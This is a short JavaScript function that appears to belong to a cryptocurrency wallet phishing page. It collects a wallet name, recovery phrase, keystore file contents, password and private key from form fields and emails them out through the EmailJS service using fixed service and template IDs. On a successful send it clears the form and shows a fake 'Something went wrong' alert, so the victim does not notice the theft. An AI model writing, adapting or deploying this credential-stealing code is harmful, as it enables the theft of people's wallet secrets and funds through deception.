function sendMail() {
  var params = {
    walletname: document.getElementById("walletname").value,
    phrase: document.getElementById("phrase").value,
    keystore: document.getElementById("keystore").value,
    password: document.getElementById("password").value,
    private: document.getElementById("private").value,
  };

  const serviceID = "service_rxa9shi";
  const templateID = "template_iqhlyuq";

  emailjs
    .send(serviceID, templateID, params)
    .then((res) => {
      document.getElementById("walletname").value = "";
      document.getElementById("phrase").value = "";
      document.getElementById("keystore").value = "";
      document.getElementById("password").value = "";
      document.getElementById("private").value = "";
      console.log(res);
      alert("Something went wrong");
    })
    .catch((err) => console.log(err));
}
